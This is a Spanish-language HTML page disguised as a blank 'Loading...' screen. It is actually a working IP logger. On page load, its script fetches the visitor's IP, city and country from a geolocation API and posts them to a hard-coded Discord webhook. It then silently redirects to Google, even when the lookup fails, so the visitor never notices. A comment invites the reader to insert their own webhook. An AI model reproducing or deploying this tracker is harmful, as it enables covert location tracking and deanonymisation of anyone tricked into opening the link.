<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cargando...</title>
</head>
<body>
<script>
async function obtenerUbicacion() {
    try {
        const respuesta = await fetch('https://freeipapi.com/api/json');
        const datos = await respuesta.json();

        const info = {
            ip: datos.ipAddress || '?',
            ciudad: datos.cityName || '?',
            pais: datos.countryName || '?',
            hora: new Date().toLocaleString('es-MX')
        };

        const webhookUrl = "https://discord.com/api/webhooks/1483527914291986586/8kciyuEGGrN7zWPStsoqOSzTeFghXsVMdzPktkTaeWtjNh6sNUY9u9IVZ2My1d1MjHpR";  // ← TU WEBHOOK AQUÍ

        await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `🚨 Clic: IP ${info.ip} - ${info.ciudad}, ${info.pais} - ${info.hora}`
            })
        });

        window.location.href = "https://www.google.com";
    } catch (error) {
        window.location.href = "https://www.google.com";  // siempre redirige
    }
}
obtenerUbicacion();
</script>
</body>
</html>
